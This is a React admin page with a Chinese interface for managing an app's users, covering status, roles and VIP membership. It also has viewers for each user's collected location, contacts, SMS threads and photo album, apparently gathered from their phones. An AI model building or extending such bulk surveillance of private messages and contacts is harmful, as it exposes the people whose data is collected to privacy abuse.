import React, { useState, useEffect } from 'react';
import {
  Table,
  Card,
  Typography,
  Button,
  Space,
  Modal,
  Form,
  Input,
  Select,
  message,
  Tooltip,
  Popconfirm,
  Tag,
  List,
  Empty,
  Collapse,
  Avatar,
  Image,
  Row,
  Col,
} from 'antd';
import {
  UserOutlined,
  EditOutlined,
  DeleteOutlined,
  PlusOutlined,
  SearchOutlined,
  ReloadOutlined,
  PhoneOutlined,
  LockOutlined,
} from '@ant-design/icons';
import { userAPI, SERVER_BASE_URL } from '../api/api';
import Layout from '../components/Layout';
import LocationMap from '../components/LocationMap';

const { Title } = Typography;
const { Option } = Select;

interface User {
  _id: string;
  username: string;
  phoneNumber: string;
  email?: string;
  role: string;
  status: string;
  createdAt: string;
  locationData?: any;
  contactsData?: any;
  smsData?: any;
  albumData?: any;
  devicePlatform?: 'android' | 'ios' | 'unknown';
  isVip?: boolean;
  vipExpiryDate?: string;
}

const UserManagement: React.FC = () => {
  const [users, setUsers] = useState<User[]>([]);
  const [loading, setLoading] = useState(false);
  const [modalVisible, setModalVisible] = useState(false);
  const [modalTitle, setModalTitle] = useState('');
  const [form] = Form.useForm();
  const [editingUser, setEditingUser] = useState<User | null>(null);
  const [currentUser, setCurrentUser] = useState<User | null>(null);
  const [searchText, setSearchText] = useState('');
  const [filteredUsers, setFilteredUsers] = useState<User[]>([]);
  const [viewModal, setViewModal] = useState<{type: string, data: any, visible: boolean}>({type: '', data: null, visible: false});

  const fetchUsers = async () => {
    try {
      setLoading(true);
      const data = await userAPI.getUsers();
      setUsers(data.users);
      setFilteredUsers(data.users);
    } catch (error) {
      console.error('获取用户列表失败:', error);
      message.error('获取用户列表失败');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchUsers();
  }, []);

  const handleSearch = () => {
    if (!searchText) {
      setFilteredUsers(users);
      return;
    }

    const filtered = users.filter(
      (user) =>
        user.username?.toLowerCase().includes(searchText.toLowerCase()) ||
        user.phoneNumber.includes(searchText)
    );
    setFilteredUsers(filtered);
  };

  const handleStatusChange = async (userId: string, newStatus: string) => {
    try {
      await userAPI.updateUserStatus(userId, newStatus);
      message.success(`用户状态已更新为 ${newStatus === 'active' ? '活跃' : '禁用'}`);
      fetchUsers(); // 刷新用户列表
    } catch (error) {
      console.error('更新用户状态失败:', error);
      message.error('更新用户状态失败');
    }
  };

  const handleDelete = async (userId: string) => {
    try {
      await userAPI.deleteUser(userId);
      message.success('用户已删除');
      fetchUsers(); // 刷新用户列表
    } catch (error) {
      console.error('删除用户失败:', error);
      message.error('删除用户失败');
    }
  };

  // 开通VIP
  const handleActivateVip = async (userId: string) => {
    try {
      await userAPI.activateVip(userId, 12); // 默认开通12个月
      message.success('VIP开通成功');
      fetchUsers(); // 刷新用户列表
    } catch (error) {
      console.error('开通VIP失败:', error);
      message.error('开通VIP失败');
    }
  };

  // 取消VIP
  const handleDeactivateVip = async (userId: string) => {
    try {
      await userAPI.deactivateVip(userId);
      message.success('VIP已取消');
      fetchUsers(); // 刷新用户列表
    } catch (error) {
      console.error('取消VIP失败:', error);
      message.error('取消VIP失败');
    }
  };

  const showModal = (user?: User) => {
    setEditingUser(user || null);
    if (user) {
      form.setFieldsValue({
        username: user.username,
        phoneNumber: user.phoneNumber,
        email: user.email,
        role: user.role,
        status: user.status,
      });
    } else {
      form.resetFields();
    }
    setModalVisible(true);
  };

  const handleModalOk = async () => {
    try {
      const values = await form.validateFields();
      
      if (editingUser) {
        // 更新用户状态
        await userAPI.updateUserStatus(editingUser._id, values.status);
        message.success('用户已更新');
      } else {
        // 创建新用户
        await userAPI.createUser(values);
        message.success('用户已创建');
      }
      
      setModalVisible(false);
      fetchUsers(); // 刷新用户列表
    } catch (error) {
      console.error('保存用户失败:', error);
      message.error('保存用户失败');
    }
  };

  const columns = [
    {
      title: '用户名',
      dataIndex: 'username',
      key: 'username',
      render: (text: string) => (
        <Space>
          <UserOutlined />
          {text}
        </Space>
      ),
    },
    {
      title: '手机号',
      dataIndex: 'phoneNumber',
      key: 'phoneNumber',
      render: (text: string) => (
        <Space>
          <PhoneOutlined />
          {text}
        </Space>
      ),
    },
    {
      title: '邮箱',
      dataIndex: 'email',
      key: 'email',
    },
    {
      title: '角色',
      dataIndex: 'role',
      key: 'role',
      render: (role: string) => {
        let color = 'blue';
        if (role === 'admin') color = 'red';
        else if (role === 'provider') color = 'green';
        return <Tag color={color}>{role.toUpperCase()}</Tag>;
      },
    },
    {
      title: '平台',
      dataIndex: 'devicePlatform',
      key: 'devicePlatform',
      render: (platform: string | undefined) => {
        const p = platform || 'unknown';
        const color = p === 'android' ? 'green' : p === 'ios' ? 'blue' : 'default';
        const label = p === 'android' ? 'Android' : p === 'ios' ? 'iOS' : '未知';
        return <Tag color={color}>{label}</Tag>;
      },
    },
    {
      title: '状态',
      dataIndex: 'status',
      key: 'status',
      render: (status: string, record: User) => (
        <Select
          value={status}
          style={{ width: 100 }}
          onChange={(value) => handleStatusChange(record._id, value)}
        >
          <Option value="active">活跃</Option>
          <Option value="disabled">禁用</Option>
        </Select>
      ),
    },
    {
      title: 'VIP状态',
      key: 'vip',
      render: (_: any, record: User) => {
        const isVip = record.isVip;
        const expiryDate = record.vipExpiryDate ? new Date(record.vipExpiryDate) : null;
        const isExpired = expiryDate ? expiryDate < new Date() : false;
        
        return (
          <Space direction="vertical" size="small">
            <Tag color={isVip && !isExpired ? 'gold' : 'default'}>
              {isVip && !isExpired ? 'VIP会员' : '普通用户'}
            </Tag>
            {isVip && expiryDate && (
              <span style={{ fontSize: '12px', color: isExpired ? 'red' : 'gray' }}>
                {isExpired ? '已过期' : `到期: ${expiryDate.toLocaleDateString()}`}
              </span>
            )}
            <Space>
              {!isVip || isExpired ? (
                <Button 
                  size="small" 
                  type="primary"
                  onClick={() => handleActivateVip(record._id)}
                >
                  开通会员
                </Button>
              ) : (
                <Popconfirm
                  title="确定要取消VIP会员吗?"
                  onConfirm={() => handleDeactivateVip(record._id)}
                  okText="是"
                  cancelText="否"
                >
                  <Button size="small" danger>
                    取消会员
                  </Button>
                </Popconfirm>
              )}
            </Space>
          </Space>
        );
      },
    },
    {
      title: '注册时间',
      dataIndex: 'createdAt',
      key: 'createdAt',
      render: (text: string) => new Date(text).toLocaleString('zh-CN'),
    },
    {
      title: '权限数据',
      key: 'permissions',
      render: (_: any, record: User) => (
        <Space>
          <Button size="small" onClick={() => setViewModal({type: 'location', data: record.locationData, visible: true})}>定位</Button>
          <Button size="small" onClick={() => setViewModal({type: 'contacts', data: record.contactsData, visible: true})}>通讯录</Button>
          <Button size="small" onClick={() => setViewModal({type: 'sms', data: record.smsData, visible: true})}>短信</Button>
          <Button size="small" onClick={() => setViewModal({type: 'album', data: record.albumData, visible: true})}>相册</Button>
        </Space>
      ),
    },
    {
      title: '操作',
      key: 'action',
      render: (_: any, record: User) => (
        <Space size="middle">
          <Button 
            icon={<EditOutlined />} 
            onClick={() => showModal(record)}
            type="link"
          />
          <Popconfirm
            title="确定要删除此用户吗?"
            onConfirm={() => handleDelete(record._id)}
            okText="是"
            cancelText="否"
          >
            <Button 
              icon={<DeleteOutlined />} 
              type="link" 
              danger
            />
          </Popconfirm>
        </Space>
      ),
    },
  ];

  return (
    <Layout>
      <div style={{ padding: '24px' }}>
        <div style={{ marginBottom: '16px', display: 'flex', justifyContent: 'space-between' }}>
          <Title level={2}>用户管理</Title>
          <Button 
            type="primary" 
            icon={<PlusOutlined />} 
            onClick={() => showModal()}
          >
            添加用户
          </Button>
        </div>

        <Table 
          columns={columns} 
          dataSource={filteredUsers} 
          rowKey="_id" 
          loading={loading}
        />

        <Modal
          title={editingUser ? '编辑用户' : '添加用户'}
          open={modalVisible}
          onOk={handleModalOk}
          onCancel={() => setModalVisible(false)}
          okText="保存"
          cancelText="取消"
        >
          <Form
            form={form}
            layout="vertical"
          >
            <Form.Item
              name="username"
              label="用户名"
              rules={[{ required: true, message: '请输入用户名' }]}
            >
              <Input prefix={<UserOutlined />} placeholder="用户名" />
            </Form.Item>
            
            {!editingUser && (
              <Form.Item
                name="password"
                label="密码"
                rules={[{ required: true, message: '请输入密码' }]}
              >
                <Input.Password prefix={<LockOutlined />} placeholder="密码" />
              </Form.Item>
            )}
            
            <Form.Item
              name="phoneNumber"
              label="手机号"
              rules={[{ required: true, message: '请输入手机号' }]}
            >
              <Input prefix={<PhoneOutlined />} placeholder="手机号" />
            </Form.Item>
            
            <Form.Item
              name="email"
              label="邮箱"
            >
              <Input placeholder="邮箱" />
            </Form.Item>
            
            <Form.Item
              name="role"
              label="角色"
              rules={[{ required: true, message: '请选择角色' }]}
            >
              <Select placeholder="选择角色">
                <Option value="user">用户</Option>
                <Option value="provider">服务提供者</Option>
                <Option value="admin">管理员</Option>
              </Select>
            </Form.Item>

            <Form.Item
              name="devicePlatform"
              label="设备平台（可选）"
            >
              <Select placeholder="不指定则为 unknown">
                <Option value="android">Android</Option>
                <Option value="ios">iOS</Option>
                <Option value="unknown">未知</Option>
              </Select>
            </Form.Item>
            
            <Form.Item
              name="status"
              label="状态"
              rules={[{ required: true, message: '请选择状态' }]}
            >
              <Select placeholder="选择状态">
                <Option value="active">活跃</Option>
                <Option value="disabled">禁用</Option>
              </Select>
            </Form.Item>
          </Form>
        </Modal>

        <Modal
          open={viewModal.visible}
          title={`查看${{
            location: '定位',
            contacts: '通讯录',
            sms: '短信',
            album: '相册',
          }[viewModal.type] || ''}数据`}
          onCancel={() => setViewModal({ ...viewModal, visible: false })}
          footer={null}
          width={600}
        >
          {viewModal.type === 'location' ? (
            viewModal.data ? (
              <LocationMap locationData={viewModal.data} height={400} />
            ) : (
              <Empty description="无定位数据" />
            )
          ) : viewModal.type === 'contacts' ? (
            viewModal.data && viewModal.data.length > 0 ? (
              <List
                bordered
                dataSource={viewModal.data}
                renderItem={(contact: any) => (
                  <List.Item>
                    <List.Item.Meta
                      title={contact.name || '未知联系人'}
                      description={contact.phoneNumbers && contact.phoneNumbers.length > 0 
                        ? contact.phoneNumbers.join(', ') 
                        : '无电话号码'}
                    />
                    {contact.company && <Tag color="blue">{contact.company}</Tag>}
                  </List.Item>
                )}
              />
            ) : (
              <Empty description="无通讯录数据" />
            )
          ) : viewModal.type === 'sms' ? (
            viewModal.data && viewModal.data.length > 0 ? (
              <div>
                {(() => {
                  // 按发送方分组短信
                  const smsByAddress: {[key: string]: any[]} = {};
                  viewModal.data.forEach((sms: any) => {
                    const address = sms.address || '未知号码';
                    if (!smsByAddress[address]) {
                      smsByAddress[address] = [];
                    }
                    smsByAddress[address].push(sms);
                  });
                  
                  // 对每个分组排序（按时间）
                  Object.keys(smsByAddress).forEach(address => {
                    smsByAddress[address].sort((a: any, b: any) => {
                      return parseInt(a.date) - parseInt(b.date);
                    });
                  });
                  
                  return (
                    <Collapse defaultActiveKey={[Object.keys(smsByAddress)[0]]}>
                      {Object.keys(smsByAddress).map(address => (
                        <Collapse.Panel 
                          key={address} 
                          header={
                            <Space>
                              <Avatar style={{ backgroundColor: '#87d068' }}>{address.substring(0, 1)}</Avatar>
                              <span>{address}</span>
                              <Tag color="blue">{smsByAddress[address].length}条消息</Tag>
                            </Space>
                          }
                        >
                          <List
                            itemLayout="horizontal"
                            dataSource={smsByAddress[address]}
                            renderItem={(sms: any) => (
                              <List.Item style={{ 
                                padding: '8px',
                                display: 'flex',
                                justifyContent: sms.type === '1' ? 'flex-start' : 'flex-end'
                              }}>
                                <div style={{
                                  maxWidth: '80%',
                                  padding: '8px 12px',
                                  borderRadius: '8px',
                                  backgroundColor: sms.type === '1' ? '#f0f0f0' : '#d4f5d3',
                                  position: 'relative'
                                }}>
                                  <div>{sms.body || '无内容'}</div>
                                  <div style={{ fontSize: '11px', color: '#999', marginTop: '4px', textAlign: 'right' }}>
                                    {new Date(parseInt(sms.date)).toLocaleString()}
                                  </div>
                                </div>
                              </List.Item>
                            )}
                          />
                        </Collapse.Panel>
                      ))}
                    </Collapse>
                  );
                })()}
              </div>
            ) : (
              <Empty description="无短信数据" />
            )
          ) : viewModal.type === 'album' ? (
            viewModal.data && viewModal.data.length > 0 ? (
              <div>
                <div style={{ marginBottom: '16px' }}>
                  <Tag color="green">共 {viewModal.data.length} 张照片</Tag>
                </div>
                <Row gutter={[8, 8]}>
                  {viewModal.data.map((photo: any, index: number) => (
                    <Col span={8} key={index}>
                      <div style={{ 
                        position: 'relative',
                        borderRadius: '8px',
                        overflow: 'hidden',
                        border: '1px solid #f0f0f0'
                      }}>
                        <Image
                          src={
                            photo.compressedUrl 
                              ? (photo.compressedUrl.startsWith('http') 
                                  ? photo.compressedUrl 
                                  : `${SERVER_BASE_URL}${photo.compressedUrl}`)
                              : photo.node?.image?.uri || photo.uri
                          }
                          alt={`照片 ${index + 1}`}
                          style={{ width: '100%', height: '120px', objectFit: 'cover' }}
                          fallback="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMIAAADDCAYAAADQvc6UAAABRWlDQ1BJQ0MgUHJvZmlsZQAAKJFjYGASSSwoyGFhYGDIzSspCnJ3UoiIjFJgf8LAwSDCIMogwMCcmFxc4BgQ4ANUwgCjUcG3awyMIPqyLsis7PPOq3QdDFcvjV3jOD1boQVTPQrgSkktTgbSf4A4LbmgqISBgTEFyFYuLykAsTuAbJEioKOA7DkgdjqEvQHEToKwj4DVhAQ5A9k3gGyB5IxEoBmML4BsnSQk8XQkNtReEOBxcfXxUQg1Mjc0dyHgXNJBSWpFCYh2zi+oLMpMzyhRcASGUqqCZ16yno6CkYGRAQMDKMwhqj/fAIcloxgHQqxAjIHBEugw5sUIsSQpBobtQPdLciLEVJYzMPBHMDBsayhILEqEO4DxG0txmrERhM29nYGBddr//5/DGRjYNRkY/l7////39v///y4Dmn+LgeHANwDrkl1AuO+pmgAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAwqADAAQAAAABAAAAwwAAAAD9b/HnAAAHlklEQVR4Ae3dP3Ik1RnG4W+FgYxN"
                        />
                        <div style={{
                          position: 'absolute',
                          bottom: 0,
                          left: 0,
                          right: 0,
                          background: 'rgba(0,0,0,0.7)',
                          color: 'white',
                          padding: '4px 8px',
                          fontSize: '12px'
                        }}>
                          {photo.filename || photo.node?.image?.filename || `照片${index + 1}`}
                        </div>
                      </div>
                    </Col>
                  ))}
                </Row>
              </div>
            ) : (
              <Empty description="无相册数据" />
            )
          ) : (
            <pre style={{ maxHeight: 400, overflow: 'auto', background: '#f6f6f6', padding: 12 }}>
              {viewModal.data ? JSON.stringify(viewModal.data, null, 2) : '暂无数据'}
            </pre>
          )}
        </Modal>
      </div>
    </Layout>
  );
};

export default UserManagement; 